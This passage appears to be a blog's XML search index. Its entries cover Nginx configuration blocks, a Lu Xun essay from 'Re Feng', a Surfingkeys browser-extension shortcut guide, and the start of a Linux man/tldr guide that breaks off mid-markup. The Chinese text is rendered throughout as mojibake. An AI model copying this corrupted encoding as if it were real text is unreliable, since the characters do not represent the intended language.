title="NginxåŸºç¡€é…ç½®"></a>NginxåŸºç¡€é…ç½®</h1><p>nginxçš„ä¸»è¦é…ç½®éƒ½æ”¾åœ¨nginx.confæ–‡ä»¶ä¸­ï¼Œ#åé¢çš„å†…å®¹è¢«æ³¨é‡Š</p><p>confæ–‡ä»¶çš„ç»“æ„ï¼š</p><ul><li>å…¨å±€å—<ul><li>é»˜è®¤é…ç½®æ–‡ä»¶ä»æœ€å¼€å§‹åˆ°eventsä¹‹é—´çš„å†…å®¹</li><li>åŒ…æ‹¬è¿è¡ŒNginxçš„ç”¨æˆ·ã€å…è®¸çš„è¿›ç¨‹æ•°ã€æ—¥å¿—è·¯å¾„ã€é…ç½®å¼•å…¥ç­‰ï¼Œå½±å“nginxæœåŠ¡å™¨æ•´ä½“è¿è¡Œ</li></ul></li><li>eventså—<ul><li>å½±å“NginxæœåŠ¡å™¨ä¸ç”¨æˆ·çš„ç½‘ç»œè¿æ¥ï¼ŒåŒ…æ‹¬é€‰æ‹©ä½•ç§äº‹ä»¶é©±åŠ¨æ¨¡å‹å¤„ç†è¿æ¥è¯·æ±‚ã€æ¯ä¸ªworker processå¯ä»¥åŒæ—¶æ”¯æŒçš„æœ€å¤§è¿æ¥æ•°ç­‰</li></ul></li><li>httpå—<ul><li>ä»£ç†ã€ç¼“å­˜ã€æ—¥å¿—å®šä¹‰ç­‰åŠŸèƒ½åœ¨æ­¤é…ç½®</li><li>è¯¥å—å†…å¯ä»¥åŒ…å«è‡ªå·±çš„å…¨å±€å—ï¼Œä¹Ÿå¯ä»¥åŒ…å«serverå—</li></ul></li><li>serverå—<ul><li>æ¯ä¸ªserverå—ç›¸å½“äºä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œå†…éƒ¨å¯ä»¥æœ‰å¤šä¸ªä¸»æœºè”åˆæä¾›æœåŠ¡ï¼Œä¸€èµ·å¯¹å¤–æä¾›æœåŠ¡</li><li>serverå—æŒ‡ä»¤çš„ä½œç”¨åŸŸåœ¨æœ¬serverå—</li><li>serverå—å¯ä»¥åŒ…å«è‡ªå·±çš„å…¨å±€å—å’Œå¤šä¸ªlocationå—</li></ul></li><li>locationå—<ul><li>æœ¬è´¨æ˜¯serverå—çš„ä¸€ä¸ªæŒ‡ä»¤ï¼Œç”±äºé‡è¦æ€§åœ¨æ­¤å•åˆ—</li><li>ä½œç”¨ï¼šåŸºäºNginxæœåŠ¡å™¨æ¥æ”¶åˆ°çš„è¯·æ±‚å­—ç¬¦ä¸²è¿›è¡ŒåŒ¹é…ï¼Œå¯¹ç‰¹å®šè¯·æ±‚è¿›è¡Œå¤„ç†<ul><li>åœ°å€å®šå‘</li><li>æ•°æ®ç¼“å­˜</li><li>åº”ç­”æ§åˆ¶ç­‰</li></ul></li><li><a href="https://www.jianshu.com/p/e154c2ef002f">location url åŒ¹é…æ•™ç¨‹</a></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>webæœåŠ¡å™¨</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>é²è¿…ã€Šçƒ­é£ã€‹ å››åä¸€ã€”ï¼‘ã€•</title>
    <link href="/p/6068f6cf/"/>
    <url>/p/6068f6cf/</url>
    
    <content type="html"><![CDATA[<h1 id="é²è¿…ã€Šçƒ­é£ã€‹-å››åä¸€ã€”ï¼‘ã€•"><a href="#é²è¿…ã€Šçƒ­é£ã€‹-å››åä¸€ã€”ï¼‘ã€•" class="headerlink" title="é²è¿…ã€Šçƒ­é£ã€‹ å››åä¸€ã€”ï¼‘ã€•"></a>é²è¿…ã€Šçƒ­é£ã€‹ å››åä¸€ã€”ï¼‘ã€•</h1><p>ä»ä¸€å°åŒ¿åä¿¡é‡Œçœ‹è§ä¸€å¥è¯ï¼Œæ˜¯â€œæ•°éº»çŸ³ç‰‡â€ï¼ˆåŸæ³¨æ±Ÿè‹æ–¹è¨€ï¼‰ï¼Œå¤§çº¦æ˜¯æ²¡æœ‰æœ¬é¢†ä¾¿ä¸å¿…æå€¡æ”¹é©ï¼Œä¸å¦‚å»æ•°çŸ³ç‰‡çš„å¥½çš„æ„æ€ã€‚å› æ­¤åˆè®°èµ·äº†æœ¬å¿—é€šä¿¡æ å†…æ‰€è½½å››å·æ–¹è¨€çš„â€œæ´—ç…¤ç‚­â€ã€”ï¼’ã€•ã€‚æƒ³æ¥åˆ«çœæ–¹è¨€ä¸­ï¼Œç›¸ç±»çš„è¯è¿˜å¤šï¼›å®ˆç€è¿™ä¸“åŠäººè‡ªæš´è‡ªå¼ƒçš„æ ¼è¨€çš„äººï¼Œä¹Ÿæ€•å¹¶<br>ä¸å°‘ã€‚</p><p>å‡¡ä¸­å›½äººè¯´ä¸€å¥è¯ï¼Œåšä¸€ä»¶äº‹ï¼Œå€˜ä¸ä¼ æ¥çš„ç§¯ä¹ æœ‰è‹¥å¹²æŠµè§¦ï¼Œé¡»ä¸€ä¸ªæ–¤æ–—ä¾¿å‘ŠæˆåŠŸï¼Œæ‰æœ‰ç«‹è¶³çš„å¤„æ‰€ï¼›è€Œä¸”è¢«æ­ç»´å¾—çƒ™é“ä¸€èˆ¬çƒ­ã€‚å¦åˆ™å…ä¸äº†æ ‡æ–°ç«‹å¼‚çš„ç½ªåï¼Œä¸è®¸è¯´è¯ï¼›æˆ–è€…ç«Ÿæˆäº†å¤§é€†ä¸é“ï¼Œä¸ºå¤©åœ°æ‰€ä¸å®¹ã€‚è¿™ä¸€ç§äººï¼Œä»å‰æœ¬å¯ä»¥å¤·åˆ°ä¹æ—ã€”ï¼“ã€•ï¼Œè¿ç´¯é‚»å±…ï¼›ç°åœ¨å´ä¸è¿‡æ˜¯å‡ å°åŒ¿åä¿¡ç½¢äº†ã€‚ä½†æ„å¿—ç•¥ç•¥è–„å¼±çš„äººä¾¿ä¸å…å› æ­¤èç¼©ï¼Œä¸çŸ¥ä¸è§‰çš„ä¹Ÿå…¥äº†â€œæ•°éº»çŸ³ç‰‡â€å…šã€‚</p><p>æ‰€ä»¥ç°åœ¨çš„ä¸­å›½ï¼Œç¤¾ä¼šä¸Šæ¯«æ— æ”¹é©ï¼Œå­¦æœ¯ä¸Šæ²¡æœ‰å‘æ˜ï¼Œç¾æœ¯ä¸Šä¹Ÿæ²¡æœ‰åˆ›ä½œï¼›è‡³äºå¤šäººç»§ç»­çš„ç ”ç©¶ï¼Œå‰ä»†åç»§çš„æ¢é™©ï¼Œé‚£æ›´ä¸å¿…æäº†ã€‚å›½äººçš„äº‹ä¸šï¼Œå¤§æŠµæ˜¯ä¸“è°‹æ—¶å¼çš„æˆåŠŸçš„ç»è¥ï¼Œä»¥åŠå¯¹äºä¸€åˆ‡çš„å†·ç¬‘ã€‚</p><p>ä½†å†·ç¬‘çš„äººï¼Œè™½ç„¶åå¯¹æ”¹é©ï¼Œå´åˆæœªå¿…æœ‰ä¿å®ˆçš„èƒ½åŠ›ï¼šå³å¦‚æ–‡å­—ä¸€é¢ï¼Œç™½è¯å›ºç„¶çœ‹ä¸ä¸Šçœ¼ï¼Œå¤æ–‡ä¹Ÿä¸ç”šæå¾—èµ·ç¬”ã€‚ç…§ä»–çš„å­¦è¯´ï¼Œæœ¬è¯¥å»â€œæ•°éº»çŸ³ç‰‡â€äº†ï¼›ä»–å´åˆä¸ç„¶ï¼Œåªæ˜¯è«åå…¶å¦™çš„å†·ç¬‘ã€‚</p><p>ä¸­å›½çš„äººï¼Œå¤§æŠµåœ¨å¦‚æ­¤ç©ºæ°”é‡ŒæˆåŠŸï¼Œåœ¨å¦‚æ­¤ç©ºæ°”é‡Œèç¼©è…è´¥ï¼Œä»¥è‡³è€æ­»ã€‚</p><p>æˆ‘æƒ³ï¼ŒäººçŒ¿åŒæºçš„å­¦è¯´ï¼Œå¤§çº¦å¯ä»¥æ¯«æ— ç–‘ä¹‰äº†ã€‚ä½†æˆ‘ä¸æ‡‚ï¼Œä½•ä»¥ä»å‰çš„å¤çŒ´å­ï¼Œä¸éƒ½åŠªåŠ›å˜äººï¼Œå´åˆ°ç°åœ¨è¿˜ç•™ç€å­å­™ï¼Œå˜æŠŠæˆç»™äººçœ‹ã€‚è¿˜æ˜¯é‚£æ—¶ç«Ÿæ²¡æœ‰ä¸€åŒ¹æƒ³ç«™èµ·æ¥å­¦è¯´äººè¯å‘¢ï¼Ÿè¿˜æ˜¯è™½ç„¶æœ‰äº†å‡ åŒ¹ï¼Œå´ç»ˆè¢«çŒ´å­ç¤¾ä¼šæ”»å‡»ä»–æ ‡æ–°ç«‹å¼‚ï¼Œéƒ½å’¬æ­»äº†ï¼›æ‰€ä»¥ç»ˆäºä¸èƒ½è¿›åŒ–å‘¢ï¼Ÿ</p><p>å°¼é‡‡ã€”ï¼”ã€•å¼çš„è¶…äººï¼Œè™½ç„¶å¤ªè§‰æ¸ºèŒ«ï¼Œä½†å°±ä¸–ç•Œç°æœ‰äººç§çš„äº‹å®çœ‹æ¥ï¼Œå´å¯ä»¥ç¡®ä¿¡å°†æ¥æ€»æœ‰å°¤ä¸ºé«˜å°šå°¤è¿‘åœ†æ»¡çš„äººç±»å‡ºç°ã€‚åˆ°é‚£æ—¶å€™ï¼Œç±»äººçŒ¿ä¸Šé¢ï¼Œæ€•è¦æ·»å‡ºâ€œç±»çŒ¿äººâ€è¿™ä¸€ä¸ªåè¯ã€‚</p><p>æ‰€ä»¥æˆ‘æ—¶å¸¸å®³æ€•ï¼Œæ„¿ä¸­å›½é’å¹´éƒ½æ‘†è„±å†·æ°”ï¼Œåªæ˜¯å‘ä¸Šèµ°ï¼Œä¸å¿…å¬è‡ªæš´è‡ªå¼ƒè€…æµçš„è¯ã€‚èƒ½åšäº‹çš„åšäº‹ï¼Œèƒ½å‘å£°çš„å‘å£°ã€‚æœ‰ä¸€åˆ†çƒ­ï¼Œå‘ä¸€åˆ†å…‰ï¼Œå°±ä»¤è¤ç«ä¸€èˆ¬ï¼Œä¹Ÿå¯ä»¥åœ¨é»‘æš—é‡Œå‘ä¸€ç‚¹å…‰ï¼Œä¸å¿…ç­‰å€™ç‚¬ç«ã€‚</p><p>æ­¤åå¦‚ç«Ÿæ²¡æœ‰ç‚¬ç«ï¼šæˆ‘ä¾¿æ˜¯å”¯ä¸€çš„å…‰ã€‚å€˜è‹¥æœ‰äº†ç‚¬ç«ï¼Œå‡ºäº†å¤ªé˜³ï¼Œæˆ‘ä»¬è‡ªç„¶å¿ƒæ‚¦è¯šæœçš„æ¶ˆå¤±ï¼Œä¸ä½†æ¯«æ— ä¸å¹³ï¼Œè€Œä¸”è¿˜è¦éšå–œã€”ï¼•ã€•èµç¾è¿™ç‚¬ç«æˆ–å¤ªé˜³ï¼›å› ä¸ºä»–ç…§äº†äººç±»ï¼Œè¿æˆ‘éƒ½åœ¨å†…ã€‚</p><p>æˆ‘åˆæ„¿ä¸­å›½é’å¹´éƒ½åªæ˜¯å‘ä¸Šèµ°ï¼Œä¸å¿…ç†ä¼šè¿™å†·ç¬‘å’Œæš—ç®­ã€‚</p><p>å°¼é‡‡è¯´ï¼š</p><blockquote><p>â€œçœŸçš„ï¼Œäººæ˜¯ä¸€ä¸ªæµŠæµã€‚åº”è¯¥æ˜¯æµ·äº†ï¼Œèƒ½å®¹è¿™æµŠæµä½¿ä»–å¹²å‡€ã€‚<br>â€œå’„ï¼Œæˆ‘æ•™ä½ ä»¬è¶…äººï¼šè¿™ä¾¿æ˜¯æµ·ï¼Œåœ¨ä»–è¿™é‡Œï¼Œèƒ½å®¹ä¸‹ä½ ä»¬çš„å¤§ä¾®è”‘ã€‚â€<br>ï¼ˆã€Šæœ­æ‹‰å›¾å¦‚æ˜¯è¯´ã€‹çš„ã€Šåºè¨€ã€‹ç¬¬ä¸‰èŠ‚ï¼‰</p></blockquote><p>çºµä»¤ä¸è¿‡ä¸€æ´¼æµ…æ°´ï¼Œä¹Ÿå¯ä»¥å­¦å­¦å¤§æµ·ï¼›æ¨ªç«–éƒ½æ˜¯æ°´ï¼Œå¯ä»¥ç›¸é€šã€‚å‡ ç²’çŸ³å­ï¼Œä»»ä»–ä»¬æš—åœ°é‡Œæ·æ¥ï¼›å‡ æ»´ç§½æ°´ï¼Œä»»ä»–ä»¬ä»èƒŒåæ³¼æ¥å°±æ˜¯äº†ã€‚è¿™è¿˜ç®—ä¸åˆ°â€œå¤§ä¾®è”‘â€â€”â€”å› ä¸ºå¤§ä¾®è”‘ä¹Ÿé¡»æœ‰èƒ†åŠ›ã€‚</p><p>ã€”ï¼‘ã€•ã€€æœ¬ç¯‡æœ€åˆå‘è¡¨äºä¸€ä¹ä¸€ä¹å¹´ä¸€æœˆåäº”æ—¥ã€Šæ–°é’å¹´ã€‹ç¬¬å…­å·ç¬¬ä¸€å·ï¼Œç½²åå”ä¿Ÿã€‚<br>ã€”ï¼’ã€•ã€€â€œæ´—ç…¤ç‚­â€ã€€è§ã€Šæ–°é’å¹´ã€‹ç¬¬äº”å·ç¬¬äºŒå·ï¼ˆä¸€ä¹ä¸€å…«å¹´å…«æœˆåäº”æ—¥ï¼‰ã€Šé€šä¿¡ã€‹æ è½½ä»»é¸¿éš½ç»™èƒ¡é€‚çš„ä¿¡ï¼šâ€œã€Šæ–°é’å¹´ã€‹ä¸€é¢è®²æ”¹è‰¯æ–‡å­¦ï¼Œä¸€é¢è®²åºŸç­æ±‰æ–‡ï¼Œæ˜¯å¦è‡ªç›¸çŸ›ç›¾ï¼Ÿæ—¢è¦åºŸç­ä¸ç”¨ï¼Œåˆç”¨åŠ›å»æ”¹è‰¯ä¸ç”¨çš„ç‰©ä»¶ã€‚æˆ‘ä»¬å››å·æœ‰å¥ä¿—è¯­è¯´ï¼šâ€œä½ è¦æ²¡æœ‰äº‹åšï¼Œä¸å¦‚æ´—ç…¤ç‚­å»ç½¢ã€‚â€<br>ã€”ï¼“ã€•ã€€ä¹æ—ã€€æŒ‡è‡ªèº«åŠè‡ªèº«ä»¥ä¸Šçš„çˆ¶ã€ç¥–ã€æ›¾ç¥–ã€é«˜ç¥–å’Œä»¥ä¸‹çš„å­ã€å­™ã€æ›¾å­™ã€ç„å­™ã€‚å¦ä¸€ç§è¯´æ³•æ˜¯ä»¥çˆ¶æ—å››ä»£ã€æ¯æ—ä¸‰ä»£ã€å¦»æ—äºŒä»£ä¸ºä¹æ—ã€‚<br>ã€”ï¼”ã€•ã€€å°¼é‡‡ï¼ˆï¼¦ï¼ï¼®ï½‰ï½…ï½”ï½šï½“ï½ƒï½ˆï½…ï¼‰ã€€å‚çœ‹æœ¬å·ç¬¬ï¼•ï¼™é¡µæ³¨ã€”ï¼’ï¼–ã€•ã€‚ä¸‹æ–‡æ‰€è¯´çš„ã€Šæœ­æ‹‰å›¾å¦‚æ˜¯è¯´ã€‹ï¼Œå³ã€Šæœ­æ‹‰å›¾æ–¯ç‰¹æ‹‰å¦‚æ˜¯è¯´ã€‹ï¼Œæ˜¯ä»–çš„ä¸€éƒ¨ä¸»è¦å“²å­¦è‘—ä½œã€‚<br>ã€”ï¼•ã€•ã€€éšå–œã€€ä½›å®¶è¯­ï¼Œã€Šä¿®å¿è¦æ—¨ã€‹è¯´ï¼šâ€œéšä»–ä¿®å–„ï¼Œå–œä»–å¾—æˆã€‚â€æ„æ€æ˜¯éšç€åˆ«äººåšå–„äº‹ï¼Œä¸ºåˆ«äººè·å¾—å–„æœè€Œé«˜å…´ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>æ–‡æ‘˜</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Surfingkeysï¼šç½‘é¡µçš„Vimæ‹“å±•</title>
    <link href="/p/408033bf/"/>
    <url>/p/408033bf/</url>
    
    <content type="html"><![CDATA[<h1 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h1><p>åœ¨è¿™é‡Œæ•´ä¸ªæµè§ˆå™¨Vimæ’ä»¶çš„èŠ±æ´»ï¼Œå…ˆè®²å‡ ä¸ªå®ç”¨æƒ…æ™¯ï¼š</p><ul><li><code>s+g</code>å¯ä»¥ç›´æ¥ä½¿ç”¨è°·æ­Œæœç´¢ç²˜è´´æ¿çš„å†…å®¹</li><li><code>o+s</code>å‘¼å‡ºStack Overflowçš„æœç´¢æ ï¼Œç›´æ¥æŒ‡å®šStack Overflowç½‘ç«™æœç´¢å†…å®¹</li><li><code>o+x</code>æ˜¾ç¤ºæœ€è¿‘å…³é—­çš„æ‰€æœ‰é¡µé¢</li><li><code>.</code>é‡å¤ä¸Šä¸€æ¬¡æ“ä½œ</li><li><code>G</code>æ»šåˆ°ç½‘é¡µæœ«å°¾</li><li><code>O</code>åœˆä¸­èŒƒå›´å†…æ‰€æœ‰çš„é“¾æ¥ï¼ŒæŒ‰ä¸‹é”®ç›˜å­—æ¯ç›´æ¥è·³è½¬</li><li><code>t</code>æ˜¾ç¤ºæ‰€æœ‰å·²ç»æ‰“å¼€çš„é¡µé¢ï¼Œå¹¶é€šè¿‡tabé”®è¿›è¡Œè·³è½¬ï¼ˆä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨é»˜è®¤æœç´¢å¼•æ“æœç´¢å†…å®¹ï¼‰</li><li>è¿›å…¥visualæ¨¡å¼ä»…ç”¨é”®ç›˜å®Œæˆä¸€ä¸ªå•è¯\å¥å­\è¡Œ\æ®µè½çš„å¤åˆ¶</li><li><code>ge</code>æ‰“å¼€Chromeæ‹“å±•é¡µé¢</li><li><code>yy</code>ç›´æ¥å¤åˆ¶å½“å‰é¡µé¢çš„åœ°å€</li></ul><p>æ‹…å¿ƒå‘½ä»¤å¤ªå¤šè®°ä¸ä½ï¼Ÿæ²¡å…³ç³»ï¼ŒæŒ‰ä¸‹ï¼Ÿç›´æ¥æ‰“å¼€å¸®åŠ©</p><h1 id="ä»€ä¹ˆæ˜¯Surfingkeys"><a href="#ä»€ä¹ˆæ˜¯Surfingkeys" class="headerlink" title="ä»€ä¹ˆæ˜¯Surfingkeys"></a>ä»€ä¹ˆæ˜¯Surfingkeys</h1><p>Surfingkeys æ˜¯ä¸€ä¸ªChrome/ç«ç‹æµè§ˆå™¨çš„æ‰©å±•ï¼Œå®‰è£…ä¹‹åå¯ä»¥é€šè¿‡ç±»ä¼¼vimçš„æ“ä½œæ¥æ§åˆ¶æµè§ˆå™¨ï¼Œæ¯”å¦‚<code>hjkl</code>æ¥è¿›è¡Œä¸Šä¸‹å·¦å³çš„ç§»åŠ¨ï¼Œ<code>e</code>  <code>d</code>æ¥å®Œæˆç½‘é¡µçš„ç¿»é¡µï¼Œ<code>gg</code>ã€<code>G</code>å®ç°ç½‘é¡µé¦–ä½çš„å¿«é€Ÿè·³è½¬</p><p>æ¯ä¸ªæŒ‰é”®/æŒ‰é”®ç»„åˆéƒ½å¯¹åº”ç€ä¸åŒçš„æ“ä½œï¼Œè®°ä½è¿™äº›å¿«æ·é”®å¯ä»¥æ–¹ä¾¿çš„æ‘†è„±é¼ æ ‡ï¼Œå¢åŠ ç”Ÿäº§åŠ›</p><p>æŒ‰ä¸‹<code>?</code>å¯ä»¥å¿«é€Ÿæ‰“å¼€å®ƒçš„å¸®åŠ©æ–‡æ¡£ï¼ŒæŒ‰ä¸‹<code>;e</code>å¯ä»¥æ›´æ”¹æ¯ä¸ªæŒ‰é”®å¯¹åº”çš„åŠŸèƒ½ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰</p><p><img src="https://img-blog.csdnimg.cn/e1a6af70f8b3489e8b50920d5202a935.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="å¸®åŠ©èœå•"></p><p><img src="https://img-blog.csdnimg.cn/00ab59eb88b24fa58fd5d87157e3e405.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="é”®ä½æ˜ å°„è®¾ç½®ï¼Œå•æœºå¯æ›´æ”¹"></p><p>ä½†æ˜¯ï¼Œéœ€æ±‚æ˜¯å› äººè€Œå¼‚çš„ã€‚ä¸ºæ±‚åŒå­˜å¼‚ï¼Œç¬”è€…ä¸‹é¢ä¼šåœ¨ä¸€å®šæƒ…å¢ƒä¸‹ä¸¾ä¾‹è¯´æ˜Surfingkeysçš„ä½¿ç”¨æ–¹æ³•</p><h1 id="æŒ‰-f-é”®è¿›å…¥å¦å…‹"><a href="#æŒ‰-f-é”®è¿›å…¥å¦å…‹" class="headerlink" title="æŒ‰ f é”®è¿›å…¥å¦å…‹"></a>æŒ‰ f é”®è¿›å…¥å¦å…‹</h1><p>f æ˜¯ä¸€ä¸ªå¾ˆå¼ºå¤§çš„æŒ‰é”®ï¼ŒæŒ‰ä¸‹ä¹‹åï¼Œåœ¨é¡µé¢çš„è¶…é“¾æ¥éƒ½ä¼šæ˜¾ç¤ºé»„è‰²çš„æ ‡ç­¾ï¼Œåªè¦æŒ‰ä¸‹å¯¹åº”çš„å­—æ¯ï¼Œå°±å¯ä»¥è¿›è¡Œè·³è½¬ï¼Œä»è€Œè§£æ”¾åŒæ‰‹</p><p><img src="https://img-blog.csdnimg.cn/50285be91253419aaeb0040fddb5fbea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="æŸ¥æ‰¾"><a href="#æŸ¥æ‰¾" class="headerlink" title="æŸ¥æ‰¾"></a>æŸ¥æ‰¾</h1><p>æŒ‰ä¸‹<code>/</code>æŒ‰é”®è¾“å…¥æ–‡æœ¬ï¼Œé‚£ä¹ˆåŒ¹é…çš„æ–‡æœ¬ä¼šé«˜äº®æ˜¾ç¤º</p><p>æŒ‰ä¸‹<code>n</code>ï¼Œåˆ™å…‰æ ‡æ»‘åŠ¨åˆ°ä¸‹ä¸€ä¸ªä½ç½®ï¼Œ  <code>N</code>æ»‘åˆ°ä¸Šä¸€ä¸ªä½ç½®</p><h1 id="æœç´¢"><a href="#æœç´¢" class="headerlink" title="æœç´¢"></a>æœç´¢</h1><p>æ™®é€šæ¨¡å¼ä¸‹ï¼ŒæŒ‰ä¸‹<code>og</code> æ‰“å¼€è°·æ­Œæœç´¢ï¼Œtabé”®å¯ä»¥åˆ‡æ¢æœç´¢å†…å®¹</p><p><img src="https://img-blog.csdnimg.cn/5de52c55af654169a892ab50650971e9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_16,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="å¤åˆ¶"><a href="#å¤åˆ¶" class="headerlink" title="å¤åˆ¶"></a>å¤åˆ¶</h1><p>yåœ¨Vimä¸­æ˜¯å¤åˆ¶æŒ‰é”®ï¼Œåœ¨Surfingkeysä¸­ä¹Ÿä¸ä¾‹å¤–</p><p><strong>æ™®é€šæ¨¡å¼ä¸‹æŒ‰ä¸‹y</strong><br><img src="https://img-blog.csdnimg.cn/a09bd9ff51b64a61b0f3bec2fbe8ab10.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_19,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>å¯è§†åŒ–æ¨¡å¼æŒ‰ä¸‹y</strong></p><p>æŒ‰ä¸‹<code>V</code>è¿›å…¥å¯è§†åŒ–æ¨¡å¼ã€‚æŒ‰ä¸‹yä¹‹åå¯ä»¥æ¥ä¸‹é¢æŒ‰é”®ï¼š</p><ul><li>å¤åˆ¶ä¸€ä¸ªå•è¯(w)</li><li>è¡Œ(I)</li><li>å¥å­(s)</li><li>æ®µè½(p)</li></ul><h1 id="ä¹¦ç­¾"><a href="#ä¹¦ç­¾" class="headerlink" title="ä¹¦ç­¾"></a>ä¹¦ç­¾</h1><p>æŒ‰ä¸‹<code>ab</code>å¯ä»¥æŠŠå½“å‰é¡µé¢åŠ å…¥ä¹¦ç­¾<br><img src="https://img-blog.csdnimg.cn/8c34f253e3cf4626afbb072a5b87b942.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="åˆ‡æ¢æ ‡ç­¾é¡µ"><a href="#åˆ‡æ¢æ ‡ç­¾é¡µ" class="headerlink" title="åˆ‡æ¢æ ‡ç­¾é¡µ"></a>åˆ‡æ¢æ ‡ç­¾é¡µ</h1><p><code>E</code> å’Œ <code>R</code>åˆ†åˆ«å¯¹åº”åˆ‡æ¢åˆ°å‰/åæ ‡ç­¾é¡µ</p><h1 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h1><p>å¾ˆå¤šVimæ’ä»¶ä¸æ”¯æŒå¯¹PDFçš„æ“ä½œï¼Œä½†æ˜¯Surfingkeyså¯ä»¥</p><p>åœ¨å¯ç”¨äº†Surfingkeysä¹‹åï¼Œé»˜è®¤ä»¥Surfingkeysæ‰“å¼€PDFï¼Œå¦‚æœæƒ³è¦å…³é—­ï¼ŒæŒ‰ä¸‹<code>;s</code>å³å¯</p><h1 id="links"><a href="#links" class="headerlink" title="links"></a>links</h1><p><a href="https://github.com/brookhong/Surfingkeys">GitHubåœ°å€</a></p>]]></content>
    
    
    <categories>
      
      <category>å·¥å…·ä½¿ç”¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linuxæ‰‹å†ŒæŒ‡å—</title>
    <link href="/p/50b51ea9/"/>
    <url>/p/50b51ea9/</url>
    
    <content type="html"><![CDATA[<h1 id="manæ‰‹å†Œ"><a href="#manæ‰‹å†Œ" class="headerlink" title="manæ‰‹å†Œ"></a>manæ‰‹å†Œ</h1><p>man æ‰‹å†Œæä¾›äº†æä½³çš„å¿«é€ŸæŸ¥è¯¢åŠŸèƒ½ï¼Œå½“æˆ‘ä»¬ä¸ç†Ÿæ‚‰æŸä¸ªæŒ‡ä»¤çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡åœ¨å‘½ä»¤è¡Œè¾“å…¥ man + command æŸ¥è¯¢åœ¨çº¿æ‰‹å†Œ</p><ul><li>sectionç±»åˆ«<ul><li>ç”±æ•°å­—æ ‡è¯†ï¼Œå…·ä½“å¦‚ä¸‹ï¼š<blockquote><p>1ï¼šå¯æ‰§è¡Œçš„ç¨‹å¼æˆ–æ˜¯shell æŒ‡ä»¤ã€‚<br>2ï¼šç³»ç»Ÿå‘¼å«ï¼ˆsystem callsï¼ŒLinux æ ¸å¿ƒæ‰€æä¾›çš„å‡½æ•°ï¼‰ã€‚<br>3ï¼šä¸€èˆ¬å‡½å¼åº“å‡½æ•°ã€‚<br>4ï¼šç‰¹æ®Šæ¡£æ¡ˆï¼ˆé€šå¸¸ä½äº/devï¼‰ã€‚<br>5ï¼šæ¡£æ¡ˆæ ¼å¼ä¸åå®šï¼Œå¦‚ /etc/passwd<br>6ï¼šæ¸¸æˆã€‚<br>7ï¼šæ‚é¡¹ï¼ˆå·¨é›†ç­‰ï¼Œå¦‚man(7)ã€groff(7)ï¼‰ã€‚<br>8ï¼šç³»ç»Ÿç®¡ç†è€…æŒ‡ä»¤ï¼ˆé€šå¸¸æ˜¯ç®¡ç†è€… root ä¸“ç”¨çš„ï¼‰ã€‚<br>9ï¼šKernel routinesï¼ˆéæ ‡å‡†ï¼‰ã€‚</p></blockquote></li><li><code>man num command</code> æŒ‡å®šæŸ¥çœ‹numæ ‡è¯†çš„å‘½ä»¤</li><li><code>man -aw command</code>æŸ¥çœ‹å‘½ä»¤æœ‰å‡ ä¸ªsectionåˆ—è¡¨</li></ul></li><li><code>man -k command</code>å¯ä»¥å¸®åŠ©æˆ‘ä»¬çº¿ä¸Šæœç´¢æ‰€æœ‰ç›¸å…³å†…å®¹ï¼Œå¹¶ä¸”é™„å¸¦å¯¹åº”çš„ç®€è¦è¯´æ˜</li><li><a href="https://github.com/man-pages-zh/manpages-zh">manæ‰‹å†Œä¸­æ–‡ç¿»è¯‘ç‰ˆ</a></li></ul><h1 id="tldr"><a href="#tldr" class="headerlink" title="tldr"></a>tldr</h1><p>å¯¹äºæŸäº›å‘½ä»¤ï¼Œman çš„å†…å®¹å®åœ¨å¤ªå¤šï¼Œæ¯”å¦‚ï¼Œæˆ‘ä»¬è¾“å…¥ <code>man gcc | wc -l</code>æ¥ç»Ÿè®¡gccçš„manæ‰‹å†Œè¡Œæ•°ï¼Œç»“æœæœ‰19991è¡Œï¼Œè¿™å¤ªå¤šäº†ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ä¸ªç²¾ç®€ç‰ˆçš„manæŒ‡ä»¤ï¼Œå®ƒå°±æ˜¯tldr</p><p><code>tldr</code> æ˜¯<code>&quot;too long; didnâ€™tread&quot;</code>çš„ç¼©å†™ï¼Œæ—¨åœ¨æ˜¾ç¤ºç®€å•ç‰ˆçš„å‘½ä»¤æ–‡æ¡£ï¼Œå¹¶æä¾›å¸¸ç”¨å‘½ä»¤ç¤ºä¾‹ï¼Œå®ƒæ˜¯githubä¸Šä¸€ä¸ª<a href="https://github.com/ostera/tldr.jsx">å¼€æºé¡¹ç›®</a></p><p>ä¸€é”®å®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 